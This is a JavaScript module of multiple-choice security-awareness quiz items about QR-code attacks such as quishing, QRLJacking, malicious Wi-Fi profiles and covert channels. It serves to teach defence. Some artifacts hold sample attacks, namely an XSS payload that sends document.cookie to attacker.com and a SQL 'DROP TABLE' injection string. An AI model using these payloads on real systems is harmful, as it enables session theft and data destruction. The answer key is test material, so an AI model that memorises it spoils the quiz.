const qr_code = {
    beginner: [
        {
            title: "Parking Meter Quishing",
            id: "qr-beginner-1",
            topic: "qr_code",
            level: "beginner",
            briefing: "You found a QR code sticker placed OVER the original code on a parking meter.",
            task: "Inspect the physical tampering.",
            artifacts: {
                observation: "The sticker edges are peeling. It feels thicker than the paint.",
                decoded_url: "http://easy-park-pay-now.com"
            },
            question: "What is the primary indicator of a physical QR code swap (Quishing)?",
            options: [
                "The code is black and white.",
                "A sticker placed on top of permanent signage or the original meter interface.",
                "It requires a phone.",
                "It offers a discount."
            ],
            correctAnswer: "A sticker placed on top of permanent signage or the original meter interface.",
            explanation: "Attackers physically paste their own QR stickers over legitimate ones to redirect payments to their site."
        },
        {
            title: "Restaurant Menu Redirect",
            id: "qr-beginner-2",
            topic: "qr_code",
            level: "beginner",
            briefing: "You scan a menu QR code at a table. It prompts you to download a PDF reader app.",
            task: "Analyze the download request.",
            artifacts: {
                scan_result: "Redirects to 'menu-pdf-viewer.apk'.",
                context: "Most menus open directly in the browser."
            },
            question: "Is it normal for a restaurant menu to require an app installation?",
            options: [
                "Yes, for extended features.",
                "No. It should open a webpage or PDF directly in the browser without installing anything.",
                "Yes, for coupons.",
                "Yes, if the food is good."
            ],
            correctAnswer: "No. It should open a webpage or PDF directly in the browser without installing anything.",
            explanation: "Malware spreads via fake updates or required 'viewers'. A menu should never require an APK/App install."
        },
        {
            title: "Email QR Code (Bypassing Filters)",
            id: "qr-beginner-3",
            topic: "qr_code",
            level: "beginner",
            briefing: "You received an email with no text, just a large QR code saying 'Scan to read secure message'.",
            task: "Identify the evasion tactic.",
            artifacts: {
                email_body: "[QR IMAGE ONLY]",
                decoded_link: "http://malicious-credential-harvester.com"
            },
            question: "Why do attackers put phishing links inside QR codes in emails?",
            options: [
                "It looks cool.",
                "Email security filters scan text/URLs but often cannot parse/decode images (QR codes), allowing the link to bypass detection.",
                "It saves paper.",
                "It is faster."
            ],
            correctAnswer: "Email security filters scan text/URLs but often cannot parse/decode images (QR codes), allowing the link to bypass detection.",
            explanation: "Quishing in email moves the attack from the protected email gateway (which can't read the image) to the user's mobile device (link click), which lacks enterprise protection."
        },
        {
            title: "Unexpected Package Lure",
            id: "qr-beginner-4",
            topic: "qr_code",
            level: "beginner",
            briefing: "A flyer on your door says 'Sorry we missed you. Scan to reschedule delivery'.",
            task: "Verify the delivery slip.",
            artifacts: {
                flyer_image: "Generic 'Delivery' logo (no specific carrier like FedEx/UPS).",
                qr_link: "http://reschedule-package-fee.com"
            },
            question: "What detail makes this flyer suspicious?",
            options: [
                "It is printed on yellow paper.",
                "Lack of specific carrier branding and the use of a generic URL asking for fees.",
                "It was left on the door.",
                "The font size."
            ],
            correctAnswer: "Lack of specific carrier branding and the use of a generic URL asking for fees.",
            explanation: "Attackers distribute random 'missed delivery' notices to neighborhoods. Real slips have tracking numbers and official carrier branding."
        },
        {
            title: "Crypto Wallet Giveaway",
            id: "qr-beginner-5",
            topic: "qr_code",
            level: "beginner",
            briefing: "A YouTube stream shows a QR code for a 'Double Your Bitcoin' giveaway.",
            task: "Assess the 'Send 1, Get 2' scheme.",
            artifacts: {
                video_overlay: "Elon Musk (Deepfake) talking about crypto.",
                qr_code: "Wallet Address: 1A1zP1e..."
            },
            question: "Are 'Send crypto to multiply it' giveaways ever real?",
            options: [
                "Yes, if Elon Musk endorses it.",
                "No. This is a classic identifying feature of crypto scams.",
                "Yes, during holidays.",
                "Maybe."
            ],
            correctAnswer: "No. This is a classic identifying feature of crypto scams.",
            explanation: "No legitimate entity will double your money for free. These streams often hijack high-profile accounts to broadcast the scam."
        },
        {
            title: "Public Wi-Fi Connection QR",
            id: "qr-beginner-6",
            topic: "qr_code",
            level: "beginner",
            briefing: "A sign at the airport says 'Scan for Free High-Speed Wi-Fi'.",
            task: "Analyze the network profile.",
            artifacts: {
                qr_action: "Join Wi-Fi Network 'Airport_Free_VIP'.",
                security: "None (Open Network)."
            },
            question: "What is the risk of scanning a 'Join Wi-Fi' QR code?",
            options: [
                "It connects you to a slow network.",
                "It can automatically connect your verification-less device to a Rogue Access Point (Evil Twin) controlled by the attacker.",
                "It uses your data.",
                "It resets your phone."
            ],
            correctAnswer: "It can automatically connect your verification-less device to a Rogue Access Point (Evil Twin) controlled by the attacker.",
            explanation: "QR codes can contain Wi-Fi configs. Scanning acts as a 'yes' to join a malicious network that can sniff your traffic."
        },
        {
            title: "Fake 2FA Setup",
            id: "qr-beginner-7",
            topic: "qr_code",
            level: "beginner",
            briefing: "An email prompts you to 'Scan this QR to set up 2FA for your bank'.",
            task: "Analyze the QR origin.",
            artifacts: {
                email_sender: "security@bank-alert-service.com",
                qr_content: "otpauth://totp/Bank:User?secret=JBSWY3DPEHPK3PXP&issuer=Bank"
            },
            question: "What happens if you scan an attacker's TOTP QR code?",
            options: [
                "You are protected.",
                "You generate codes on your phone, BUT the attacker also has the secret key, so they can generate the EXACT SAME codes.",
                "The app crashes.",
                "Nothing."
            ],
            correctAnswer: "You generate codes on your phone, BUT the attacker also has the secret key, so they can generate the EXACT SAME codes.",
            explanation: "If the attacker gives you the seed (QR), they keep a copy. Now they can generate valid 2FA codes for your account anytime they want."
        },
        {
            title: "Bus Stop Ad Survey",
            id: "qr-beginner-8",
            topic: "qr_code",
            level: "beginner",
            briefing: "An ad asks you to 'Scan to Win a Gift Card'.",
            task: "Identify the data gathering trap.",
            artifacts: {
                qr_link: "http://survey-monkey-rewards.com/win",
                form: "Asks for Name, Email, Phone, Address."
            },
            question: "Is scanning random QR codes in public safe?",
            options: [
                "Yes, always.",
                "No. It exposes you to malware sites or data harvesting forms.",
                "Yes, if you have an iPhone.",
                "Yes, if you are fast."
            ],
            correctAnswer: "No. It exposes you to malware sites or data harvesting forms.",
            explanation: "Curiosity scanning ('attractor' codes) creates an easy path for attackers to gather marketing data or deliver drive-by downloads."
        },
        {
            title: "Bill Payment Mailer",
            id: "qr-beginner-9",
            topic: "qr_code",
            level: "beginner",
            briefing: "You received a paper bill with a QR code for 'Easy Payment'.",
            task: "Verify the bill authenticity.",
            artifacts: {
                letter: "Logo implies 'City Water'. The QR code looks like a sticker.",
                link: "http://city-water-payment-portal.net"
            },
            question: "How should you pay utility bills?",
            options: [
                "Scan the code immediately.",
                "Navigate to the utility's official website manually/independently of the mailer.",
                "Cash in an envelope.",
                "Call the number on the sticker."
            ],
            correctAnswer: "Navigate to the utility's official website manually/independently of the mailer.",
            explanation: "Always trust the known good URL (from previous bills or search) over a convenience link/QR in a potentially forged mailer."
        },
        {
            title: "Event Ticket Scalper",
            id: "qr-beginner-10",
            topic: "qr_code",
            level: "beginner",
            briefing: "You bought a ticket from a scalper. It's just a screenshot of a QR code.",
            task: "Determine validity.",
            artifacts: {
                image: "Static Screenshot of a Ticketmaster QR.",
                risk: "Replay / Duplicate Sale."
            },
            question: "Why are static QR screenshots risky for tickets?",
            options: [
                "They are blurry.",
                "The seller can sell the same screenshot to 50 people. Only the first one to scan gets in.",
                "They don't work.",
                "Phone battery dies."
            ],
            correctAnswer: "The seller can sell the same screenshot to 50 people. Only the first one to scan gets in.",
            explanation: "Modern tickets use rotating barcodes (changing every 15s) to prevent this. A static QR screenshot is often a scam or a duplicate."
        }
    ],
    intermediate: [
        {
            title: "Malicious vCard (Contact) QR",
            id: "qr-intermediate-1",
            topic: "qr_code",
            level: "intermediate",
            briefing: "Scan this code to add the 'Event Organizer' to your contacts.",
            task: "Analyze the vCard payload.",
            artifacts: {
                payload: "BEGIN:VCARD... TEL;WORK;VOICE:(800) 555-0199... URL:http://malware-site.com",
                risk: "Pre-populating trusted fields with malicious data."
            },
            question: "Why is a malicious vCard dangerous?",
            options: [
                "It fills your address book.",
                "It can insert a malicious URL into the contact's 'Website' field, or use a premium rate number as the 'Work' number, which you might trust and dial later.",
                "It deletes contacts.",
                "It changes your wallpaper."
            ],
            correctAnswer: "It can insert a malicious URL into the contact's 'Website' field, or use a premium rate number as the 'Work' number, which you might trust and dial later.",
            explanation: "Attacks exploit trust. You scan the contact at a conference. Weeks later, you click the 'Website' link in their profile, forgetting it came from an untrusted QR."
        },
        {
            title: "App Store Redirect (Fleeceware)",
            id: "qr-intermediate-2",
            topic: "qr_code",
            level: "intermediate",
            briefing: "Scan to download the free 'QR Scanner Pro' app.",
            task: "Inspect the app store link behavior.",
            artifacts: {
                link: "https://apps.apple.com/app/id123456 (Real Store Link)",
                app_details: "Free download. Small print: $50/week subscription starts immediately after 3-day trial."
            },
            question: "What is Fleeceware?",
            options: [
                "Warm clothing apps.",
                "Apps that are technically legitimate (no malware) but charge exorbitant subscription fees for basic functionality, often trapping users who forget to cancel.",
                "Viruses.",
                "Crypto miners."
            ],
            correctAnswer: "Apps that are technically legitimate (no malware) but charge exorbitant subscription fees for basic functionality, often trapping users who forget to cancel.",
            explanation: "QR codes for 'Utility Apps' often lead to Fleeceware. They abide by store rules but exploit billing mechanics to drain wallets."
        },
        {
            title: "Embedded QR in PDF Invoice",
            id: "qr-intermediate-3",
            topic: "qr_code",
            level: "intermediate",
            briefing: "You received a PDF invoice. It has a QR code for 'Quick Payment'.",
            task: "Analyze the payment destination.",
            artifacts: {
                pdf_content: "Invoice #9922. Total: $500. Scan to Pay.",
                qr_link: "https://paypal-me.payment-secure-portal.com/u/badactor"
            },
            question: "Why use a QR in a digital PDF invoice?",
            options: [
                "It's modern.",
                "To force the user to move from a secured desktop (with antivirus/firewall) to an unsecured mobile device to complete the transaction.",
                "To save ink.",
                "To track items."
            ],
            correctAnswer: "To force the user to move from a secured desktop (with antivirus/firewall) to an unsecured mobile device to complete the transaction.",
            explanation: "Cross-device attacks are effective. Security controls on a PC often don't exist on the mobile device used to scan the code."
        },
        {
            title: "Command & Control via QR",
            id: "qr-intermediate-4",
            topic: "qr_code",
            level: "intermediate",
            briefing: "Malware on a PC is displaying a QR code on the screen.",
            task: "Determine the malware's goal.",
            artifacts: {
                screen: "Ransomware Note: Pay 1 BTC to this address to decrypt. [QR CODE]",
                purpose: "Ease of payment."
            },
            question: "Why do ransomware screens use QR codes?",
            options: [
                "They look scary.",
                "To facilitate immediate payment by the victim using a mobile wallet, reducing friction/time for the victim to 'change their mind'.",
                "To hack the phone too.",
                "To prove it's real."
            ],
            correctAnswer: "To facilitate immediate payment by the victim using a mobile wallet, reducing friction/time for the victim to 'change their mind'.",
            explanation: "Complexity kills conversion. Ransomware authors want payment to be as easy as scanning a menu."
        },
        {
            title: "Social Media Login QR (QRLJacking)",
            id: "qr-intermediate-5",
            topic: "qr_code",
            level: "intermediate",
            briefing: "A legitimate-looking site asks you to 'Scan to Login with WhatsApp'.",
            task: "Identify the session hijacking attempt.",
            artifacts: {
                site: "http://whatsapp-promo-login.com",
                mechanism: "Displays a real WhatsApp Web login QR code from the attacker's session."
            },
            question: "How does QRLJacking work?",
            options: [
                "It guesses your password.",
                "The attacker initializes a session on their side, captures the QR, and shows it to you. You scan it, authorizing THEIR session as if it were yours.",
                "It breaks encryption.",
                "It uses Bluetooth."
            ],
            correctAnswer: "The attacker initializes a session on their side, captures the QR, and shows it to you. You scan it, authorizing THEIR session as if it were yours.",
            explanation: "You think you are logging yourself in. Actually, you are authorizing the attacker's browser to access your account."
        },
        {
            title: "Fake Parking Ticket QR",
            id: "qr-intermediate-6",
            topic: "qr_code",
            level: "intermediate",
            briefing: "You found a 'Parking Violation' on your windshield with a QR code.",
            task: "Verify the ticket authority.",
            artifacts: {
                ticket: "Generic thermal printout. No license plate listed.",
                link: "http://pay-city-fine.com"
            },
            question: "What is the giveaway on this fake ticket?",
            options: [
                "It is wet.",
                "Lack of vehicle-specific details (License Plate/Make/Model). Real tickets must identify the car.",
                "The QR is square.",
                "It is expensive."
            ],
            correctAnswer: "Lack of vehicle-specific details (License Plate/Make/Model). Real tickets must identify the car.",
            explanation: "Scammers place thousands of generic tickets on random cars. They can't pre-print your license plate. Real citations are specific."
        },
        {
            title: "Survey Scam (Typosquatting)",
            id: "qr-intermediate-7",
            topic: "qr_code",
            level: "intermediate",
            briefing: "A code on a receipt says 'Scan for feedback'.",
            task: "Check the URL.",
            artifacts: {
                store: "Walmart",
                link: "http://walmrat.com/feedback"
            },
            question: "What technique is used here?",
            options: [
                "SQL Injection.",
                "Typosquatting (walmrat instead of walmart).",
                "XSS.",
                "Buffer Overflow."
            ],
            correctAnswer: "Typosquatting (walmrat instead of walmart).",
            explanation: "Visual similarity tricks users. On a mobile screen (address bar hidden/small), 'walmrat' looks like 'walmart'."
        },
        {
            title: "Cryptojacking Script",
            id: "qr-intermediate-8",
            topic: "qr_code",
            level: "intermediate",
            briefing: "Scanning a code loads a webpage that makes your phone hot.",
            task: "Analyze the page behavior.",
            artifacts: {
                url: "http://free-games.Site",
                symptom: "Battery draining rapidly. CPU usage 100%.",
                code: "WASM Miner detected."
            },
            question: "What is the site doing?",
            options: [
                "Updating software.",
                "Using your phone's processor to mine cryptocurrency (Cryptojacking) while the tab is open.",
                "Charging the battery.",
                "Running a benchmark."
            ],
            correctAnswer: "Using your phone's processor to mine cryptocurrency (Cryptojacking) while the tab is open.",
            explanation: "Malicious sites run JS miners. Mobile devices are less powerful but aggregated in the thousands via QR campaigns, they generate profit."
        },
        {
            title: "Attended Robot / Kiosk QR",
            id: "qr-intermediate-9",
            topic: "qr_code",
            level: "intermediate",
            briefing: "A self-checkout kiosk has a QR sticker: 'System Down. Pay Here'.",
            task: "Verify the out-of-order claim.",
            artifacts: {
                kiosk_screen: "Screen is on and looks normal, but a sticker covers the card reader.",
                sticker: "Cash App QR Code: $StoreManager."
            },
            question: "Does a major retailer take payments via personal Cash App tags?",
            options: [
                "Yes, they are hip.",
                "No. Corporate payments go through integrated POS systems, never personal P2P wallets.",
                "Maybe if the manager says so.",
                "Only on weekends."
            ],
            correctAnswer: "No. Corporate payments go through integrated POS systems, never personal P2P wallets.",
            explanation: "This is a social engineering overlay. The machine works, but the attacker convinces you to pay them directly instead."
        },
        {
            title: "Boarding Pass QR Theft",
            id: "qr-intermediate-10",
            topic: "qr_code",
            level: "intermediate",
            briefing: "You posted a selfie with your boarding pass QR code.",
            task: "Identify the PII leak.",
            artifacts: {
                image: "Clear photo of the barcode.",
                data: "Decoded: Name, Frequent Flyer Number, PNR (Record Locator)."
            },
            question: "What can an attacker do with your Boarding Pass QR?",
            options: [
                "See where you are going.",
                "Log into the airline website using your PNR/Name to cancel/change your flight or steal your frequent flyer points.",
                "Join you on the plane.",
                "Nothing."
            ],
            correctAnswer: "Log into the airline website using your PNR/Name to cancel/change your flight or steal your frequent flyer points.",
            explanation: "A PNR is a password. Anyone with your Name + PNR (embedded in the QR) has full control over your booking."
        }
    ],
    advanced: [
        {
            title: "Malicious Configuration Profile (iOS)",
            id: "qr-advanced-1",
            topic: "qr_code",
            level: "advanced",
            briefing: "Scanning the code prompts to install a 'Security Update' profile.",
            task: "Analyze the mobileconfig payload.",
            artifacts: {
                prompt: "Install 'Corporate Wi-Fi Profile'?",
                payload: "Contains a Root CA Certificate and Proxy settings pointing to the attacker's server."
            },
            question: "What is the danger of installing a Malicious Configuration Profile?",
            options: [
                "It slows down the phone.",
                "It can route all traffic (including SSL if a Root CA is installed) through the attacker's proxy (Man-in-the-Middle), allowing them to read encrypted data.",
                "It changes the time zone.",
                "It locks the screen."
            ],
            correctAnswer: "It can route all traffic (including SSL if a Root CA is installed) through the attacker's proxy (Man-in-the-Middle), allowing them to read encrypted data.",
            explanation: "MDM/Config profiles are powerful. Malicious ones can re-route traffic, install apps, or wipe devices."
        },
        {
            title: "QR Phishing with Homograph Attack",
            id: "qr-advanced-2",
            topic: "qr_code",
            level: "advanced",
            briefing: "The URL on the screen looks like 'apple.com' but behaves strangely.",
            task: "Analyze the punycode.",
            artifacts: {
                display: "apple.com",
                actual: "xn--pple-43d.com (Cyrillic 'a')"
            },
            question: "How does a Homograph attack work?",
            options: [
                "It uses heavy graphics.",
                "It uses characters from other scripts (Cyrillic, Greek) that look identical to Latin letters (e.g., 'a' vs 'axyz') to spoof domains.",
                "It is a spelling error.",
                "It redirects to home."
            ],
            correctAnswer: "It uses characters from other scripts (Cyrillic, Greek) that look identical to Latin letters (e.g., 'a' vs 'axyz') to spoof domains.",
            explanation: "IDN Homograph attacks are effective in QR codes because users often don't see the full address bar on mobile browsers after scanning."
        },
        {
            title: "Dynamic QR Code Redirection",
            id: "qr-advanced-3",
            topic: "qr_code",
            level: "advanced",
            briefing: "A code pointed to a safe site yesterday. Today it points to malware.",
            task: "Explain the mechanic.",
            artifacts: {
                qr_type: "Dynamic QR (Redirector Service)",
                backend: "The QR content is a shortlink (bit.ly/xyz) controlled by the attacker."
            },
            question: "Why are Dynamic QR codes dangerous for static print materials?",
            options: [
                "They fade.",
                "The destination URL can be changed by the creator at any time after printing, turning a safe poster into a malicious one instantly.",
                "They are expensive.",
                "They don't scan."
            ],
            correctAnswer: "The destination URL can be changed by the creator at any time after printing, turning a safe poster into a malicious one instantly.",
            explanation: "Attackers can print legitimate-looking marketing materials, wait for distribution, and then switch the redirect payload to malware."
        },
        {
            title: "SQL Injection via QR",
            id: "qr-advanced-4",
            topic: "qr_code",
            level: "advanced",
            briefing: "A warehouse scanner crashes when scanning a specific inventory label.",
            task: "Analyze the barcode data.",
            artifacts: {
                qr_content: "'; DROP TABLE inventory; --",
                system: "Legacy Inventory Management DB"
            },
            question: "Can a QR code attack a backend database?",
            options: [
                "No, it's just a link.",
                "Yes. If the scanning application inputs the QR data directly into a SQL query without sanitization, it can execute SQL Injection.",
                "Only on Tuesdays.",
                "No, scanners are read-only."
            ],
            correctAnswer: "Yes. If the scanning application inputs the QR data directly into a SQL query without sanitization, it can execute SQL Injection.",
            explanation: "QR codes are just data input methods. Like a text box, if the input is treated as code (SQL/Command Injection), it executes."
        },
        {
            title: "XSS in QR Readers",
            id: "qr-advanced-5",
            topic: "qr_code",
            level: "advanced",
            briefing: "Scanning a code executes JavaScript in the scanner's history view.",
            task: "Identify the Stored XSS.",
            artifacts: {
                payload: "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                location: "Admin Log Dashboard"
            },
            question: "How does this attack propagate?",
            options: [
                "Via Wi-Fi.",
                "The malicious string is saved in the database. When an admin views the 'Scan Logs' webpage, the script attempts to steal their session cookie.",
                "Magic.",
                "Bluetooth."
            ],
            correctAnswer: "The malicious string is saved in the database. When an admin views the 'Scan Logs' webpage, the script attempts to steal their session cookie.",
            explanation: "This is 'Blind XSS'. The payload triggers not on the scanner, but on the dashboard where scan logs are reviewed."
        },
        {
            title: "QR Flooding (Denial of Service)",
            id: "qr-advanced-6",
            topic: "qr_code",
            level: "advanced",
            briefing: "The ticketing system is overwhelmed by invalid scans.",
            task: "Analyze the traffic.",
            artifacts: {
                traffic: "100,000 scans per second.",
                source: "Botnet generating random QR images and submitting them to the processing API."
            },
            question: "What is the goal of QR Flooding?",
            options: [
                "To get free tickets.",
                "To exhaust the server resources (CPU/RAM) used to decode and validate the images, causing a DoS for legitimate users.",
                "To print more codes.",
                "To validate the system."
            ],
            correctAnswer: "To exhaust the server resources (CPU/RAM) used to decode and validate the images, causing a DoS for legitimate users.",
            explanation: "Image processing (decoding QRs) is CPU intensive. Flooding an endpoint with images can crash the backend service."
        },
        {
            title: "Malicious Wi-Fi Profile (Man-in-the-Middle)",
            id: "qr-advanced-7",
            topic: "qr_code",
            level: "advanced",
            briefing: "Code automatically adds a Wi-Fi network and connects.",
            task: "Inspect the network setting.",
            artifacts: {
                ssid: "Corporate_Secure",
                proxy: "192.168.1.55:8080 (Attacker IP)"
            },
            question: "What happens if a QR code defines a Proxy for a Wi-Fi network?",
            options: [
                "Internet is faster.",
                "All traffic is routed through the specified proxy, allowing the attacker to inspect simple HTTP traffic or attempt SSL stripping.",
                "It saves battery.",
                "It blocks ads."
            ],
            correctAnswer: "All traffic is routed through the specified proxy, allowing the attacker to inspect simple HTTP traffic or attempt SSL stripping.",
            explanation: "Android/iOS allow QR codes to set proxy details for Wi-Fi. This is an instant MitM setup."
        },
        {
            title: "Hidden QR in Steganography",
            id: "qr-advanced-8",
            topic: "qr_code",
            level: "advanced",
            briefing: "An innocent-looking photo contains a hidden QR code.",
            task: "Recover the payload.",
            artifacts: {
                technique: "Least Significant Bit (LSB) encoding.",
                result: "A QR code image file extracted from the noise."
            },
            question: "Why hide a QR code inside another image?",
            options: [
                "To save space.",
                "To bypass visual inspections or automated image scanners that only look for standard QR patterns.",
                "Artistic choice.",
                "It's accidental."
            ],
            correctAnswer: "To bypass visual inspections or automated image scanners that only look for standard QR patterns.",
            explanation: "Steganography hides the existence of the message. Detection requires statistical analysis of the image file."
        },
        {
            title: "Camera Buffer Overflow",
            id: "qr-advanced-9",
            topic: "qr_code",
            level: "advanced",
            briefing: "Scanning this code crashes the camera app immediately.",
            task: "Analyze the fuzzing payload.",
            artifacts: {
                qr_content: "A string of 5,000 'A' characters followed by memory addresses.",
                effect: "Memory corruption."
            },
            question: "What is the potential impact of a decoder crash?",
            options: [
                "Phone restart.",
                "Remote Code Execution (RCE). If the crash is exploitable, the attacker could take control of the device just by having the camera view the code.",
                "Blurry photos.",
                "Battery drain."
            ],
            correctAnswer: "Remote Code Execution (RCE). If the crash is exploitable, the attacker could take control of the device just by having the camera view the code.",
            explanation: "Vulnerabilities in image parsing libraries (like libjpeg or QR decoders) can lead to RCE."
        },
        {
            title: "Physical Layer (Theft via Overlay)",
            id: "qr-advanced-10",
            topic: "qr_code",
            level: "advanced",
            briefing: "A bike rental QR code was replaced.",
            task: "Track the revenue loss.",
            artifacts: {
                victim_count: "500 users paid the attacker's wallet.",
                service_loss: "$5,000 and stolen bikes (unlocked by attacker)."
            },
            question: "How does the attacker unlock the bike if the money goes to them?",
            options: [
                "They can't.",
                "They forward the valid unlock command to the bike after taking a 'fee', or they simply steal the money and the bike stays locked (DoS).",
                "They use a key.",
                "They guess the code."
            ],
            correctAnswer: "They forward the valid unlock command to the bike after taking a 'fee', or they simply steal the money and the bike stays locked (DoS).",
            explanation: "Sophisticated attackers act as a proxy, taking payment and then paying the legitimate service (using stolen cards) or simply denying service."
        }
    ],
    expert: [
        {
            title: "QRLJacking with Session Fixation",
            id: "qr-expert-1",
            topic: "qr_code",
            level: "expert",
            briefing: "Attacker forces a known session ID via QR login.",
            task: "Analyze the session flow.",
            artifacts: {
                qr_payload: "http://service.com/login?session_id=ATTACKER_KNOWN_ID",
                outcome: "User logs in, session becomes active. Attacker already has the cookie."
            },
            question: "How does Session Fixation differ from Hijacking?",
            options: [
                "It's the same.",
                "In fixation, the attacker sets the Session ID *before* the user logs in. In hijacking, they steal it *after*.",
                "It uses Bluetooth.",
                "It relies on magic."
            ],
            correctAnswer: "In fixation, the attacker sets the Session ID *before* the user logs in. In hijacking, they steal it *after*.",
            explanation: "The QR code plants the seed. Once the user authenticates, that seed (session ID) becomes valid, and the attacker is already holding it."
        },
        {
            title: "Phantom QR (Ghost Code)",
            id: "qr-expert-2",
            topic: "qr_code",
            level: "expert",
            briefing: "A QR code is only visible under UV light or specific angles.",
            task: "Detect the covert channel.",
            artifacts: {
                medium: "UV Ink on a wall.",
                purpose: "Dead drop communication for spies/insiders."
            },
            question: "What is the primary use of a 'Ghost' QR code?",
            options: [
                "Marketing.",
                "Covert communication or marking physical locations for augmented reality games/attacks without alerting the public.",
                "decoration.",
                "Lighting."
            ],
            correctAnswer: "Covert communication or marking physical locations for augmented reality games/attacks without alerting the public.",
            explanation: "Hiding the code limits the audience to those who know how to look (e.g., using a UV filter camera)."
        },
        {
            title: "QR-Based Exfiltration (Optical Channel)",
            id: "qr-expert-3",
            topic: "qr_code",
            level: "expert",
            briefing: "An air-gapped computer is flashing QR codes on screen.",
            task: "Analyze the data leak.",
            artifacts: {
                mechanism: "A script converts sensitive files to a stream of rotating QR codes.",
                receiver: "A drone or camera recording the screen from outside the window."
            },
            question: "How does this breach the air-gap?",
            options: [
                "It doesn't.",
                "It constructs an optical covert channel. No network connection is needed, just line-of-sight.",
                "It uses Wi-Fi.",
                "Sound waves."
            ],
            correctAnswer: "It constructs an optical covert channel. No network connection is needed, just line-of-sight.",
            explanation: "Air-gapped systems are vulnerable to physical side channels. Screen-to-Camera (Optical) exfiltration is high-bandwidth."
        },
        {
            title: "Deep Learning Decoder Adversarial Attack",
            id: "qr-expert-4",
            topic: "qr_code",
            level: "expert",
            briefing: "A QR code looks like random noise to humans but decodes to a URL by AI vision.",
            task: "Evaluate the adversarial example.",
            artifacts: {
                image: "Perturbed pixel noise.",
                target: "Automated conveyor belt scanner involving Computer Vision."
            },
            question: "What is an Adversarial Attack on CV?",
            options: [
                "Breaking the camera.",
                "Crafting input with imperceptible noise that tricks a Neural Network into misclassifying it (e.g., seeing a QR code where there is none).",
                "Turning off the lights.",
                "Using a laser."
            ],
            correctAnswer: "Crafting input with imperceptible noise that tricks a Neural Network into misclassifying it (e.g., seeing a QR code where there is none).",
            explanation: "This targets the machine learning model itself, forcing it to read data that isn't visually present to a human or standard algorithm."
        },
        {
            title: "Micro-QR Stego in Printed Documents",
            id: "qr-expert-5",
            topic: "qr_code",
            level: "expert",
            briefing: "Yellow dots on a printed page form a microscopic QR.",
            task: "link the document to the leaker.",
            artifacts: {
                pattern: "Machine Identification Code (MIC) / Printer Steganography.",
                content: "Printer Serial Number and Timestamp."
            },
            question: "How are whistleblowers often caught?",
            options: [
                "Fingerprints.",
                "Tracking dots (Micro-dots) printed by color laser printers that identify exactly when and where a document was printed.",
                "Cameras.",
                "DNA."
            ],
            correctAnswer: "Tracking dots (Micro-dots) printed by color laser printers that identify exactly when and where a document was printed.",
            explanation: "Most color laser printers secretly encode tracking data in yellow dots on every page to trace counterfeiting or leaks."
        },
        {
            title: "QR Code fuzzing against EMM",
            id: "qr-expert-6",
            topic: "qr_code",
            level: "expert",
            briefing: "A QR enrollment code crashes the Enterprise Mobility Management agent.",
            task: "Analyze the buffer overflow.",
            artifacts: {
                field: "JSON payload in QR.",
                value: "Overlong string in 'ServerURL' parameter."
            },
            question: "Why target EMM enrollment?",
            options: [
                "To skip work.",
                "To bypass device enrollment restrictions or crash the security agent, leaving the device unmanaged but accessing corporate data.",
                "To get free apps.",
                "To save battery."
            ],
            correctAnswer: "To bypass device enrollment restrictions or crash the security agent, leaving the device unmanaged but accessing corporate data.",
            explanation: "If the enrollment agent crashes but the certificates are partially installed, the device might get access without the restrictions."
        },
        {
            title: "Holographic QR Spoofing",
            id: "qr-expert-7",
            topic: "qr_code",
            level: "expert",
            briefing: "A QR code changes based on viewing angle.",
            task: "Analyze the physical attack.",
            artifacts: {
                material: "Lenticular printing.",
                effect: "Angle A = Legit Menu. Angle B = Malware Site."
            },
            question: "What makes lenticular QRs dangerous?",
            options: [
                "They are shiny.",
                "They defeat static visual inspection. A security guard checking it sees the 'Legit' code, but a user sitting at a different angle sees the 'Malware' code.",
                "They cost more.",
                "They are unauthorized."
            ],
            correctAnswer: "They defeat static visual inspection. A security guard checking it sees the 'Legit' code, but a user sitting at a different angle sees the 'Malware' code.",
            explanation: "The physical substrate allows two different images to exist in the same space, dependent on the observer's position."
        },
        {
            title: "Audio-Modulated QR (Screen-to-Mic)",
            id: "qr-expert-8",
            topic: "qr_code",
            level: "expert",
            briefing: "A flickering QR code on a screen generates audio interference.",
            task: "Detect the side channel.",
            artifacts: {
                frequency: "Screen refresh rate modulation.",
                receiver: "AM Radio pickup near the screen."
            },
            question: "Can a screen emit radio waves?",
            options: [
                "No.",
                "Yes (Van Eck Phreaking). The electromagnetic radiation from the screen components can be modulated to transmit data to a nearby receiver.",
                "Only CRT monitors.",
                "Magic."
            ],
            correctAnswer: "Yes (Van Eck Phreaking). The electromagnetic radiation from the screen components can be modulated to transmit data to a nearby receiver.",
            explanation: "Tempest/Van Eck attacks use EM leaks. A QR code flashing pattern can induce detectable signals in the power line or AM spectrum."
        },
        {
            title: "QR Quine (Self-Replicating)",
            id: "qr-expert-9",
            topic: "qr_code",
            level: "expert",
            briefing: "A QR code contains the source code to generate itself.",
            task: "Analyze the quine.",
            artifacts: {
                content: "Python script that, when executed, prints the QR code containing the script.",
                risk: "Polyglot files."
            },
            question: "What is a Polyglot QR?",
            options: [
                "A code that speaks languages.",
                "A file that is valid as multiple formats (e.g., a valid image AND valid Javascript code).",
                "A big image.",
                "A broken file."
            ],
            correctAnswer: "A file that is valid as multiple formats (e.g., a valid image AND valid Javascript code).",
            explanation: "Attackers use polyglots to bypass filters. A file looks like a harmless image (QR) to the antivirus, but executes as code in the browser."
        },
        {
            title: "Zero-Click QR Exploit",
            id: "qr-expert-10",
            topic: "qr_code",
            level: "expert",
            briefing: "Merely the camera 'seeing' the code triggers the exploit.",
            task: "Identify the parser vulnerability.",
            artifacts: {
                component: "OS Camera Preview Engine.",
                trigger: "Parsing the QR metadata overlay."
            },
            question: "Why are Zero-Click exploits so critical?",
            options: [
                "They verify trust.",
                "The user doesn't need to click/accept anything. Interactionless compromise occurs instantly upon processing the input.",
                "They are cheap.",
                "They are slow."
            ],
            correctAnswer: "The user doesn't need to click/accept anything. Interactionless compromise occurs instantly upon processing the input.",
            explanation: "If the decoder library has a buffer overflow, the exploit runs as soon as the camera attempts to highlight the code."
        }
    ]
};

module.exports = qr_code;
